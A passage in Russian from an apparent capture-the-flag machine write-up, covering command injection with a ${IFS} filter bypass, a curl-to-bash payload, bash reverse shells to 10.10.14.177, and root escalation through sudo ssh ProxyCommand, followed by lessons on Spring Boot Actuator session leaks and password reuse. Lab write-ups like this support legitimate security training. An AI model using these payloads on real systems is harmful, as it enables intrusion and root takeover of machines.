## 6. Command Injection через /executessh - обход фильтра

Обходим фильтрацию пробелов через `${IFS}` (Internal Field Separator - bash использует его как разделитель слов, визуально не являясь пробелом).

**Готовим reverse shell на Kali:**
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.177/4444 0>&1' > rev.sh

python3 -m http.server 7000
```

```bash
nc -lvnp 4444
```

**Payload в поле Username на `/admin`:**
```
test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
```

Через несколько секунд - shell от имени `app`.

## 13. Эксплуатация - ProxyCommand

```bash

```

**На целевой машине:**
```bash
sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
```

`ssh` при указании `ProxyCommand` выполняет заданную команду в shell **до** попытки реального SSH-соединения - раз сам `ssh` запущен через sudo от root, команда внутри `ProxyCommand` тоже выполняется с правами root.

# Ключевые уроки машины

1. **Spring Boot Actuator - недооценённый источник утечек.** `/actuator/sessions` отдаёт ID активных сессий без авторизации, что позволяет угнать сессию администратора простой подменой cookie.
2. **Command Injection через `${IFS}`** - классический обход фильтрации пробелов в параметрах, передаваемых в shell-команду.
3. **Распаковка JAR-файлов** - `application.properties` внутри Spring Boot JAR часто содержит креды БД в открытом виде.
4. **bcrypt-хеши в PostgreSQL** - даже захешированные пароли (`$2a$10$...`) уязвимы к брутфорсу через Hashcat (mode 3200), если пароль слабый.
5. **Password reuse между приложением и SSH** - пароль администратора веб-панели подошёл к системному SSH-аккаунту.
6. **`sudo ssh` с `ProxyCommand`** - классический GTFOBins-вектор: разрешение запускать `ssh` от root с произвольными аргументами эквивалентно полному root shell.
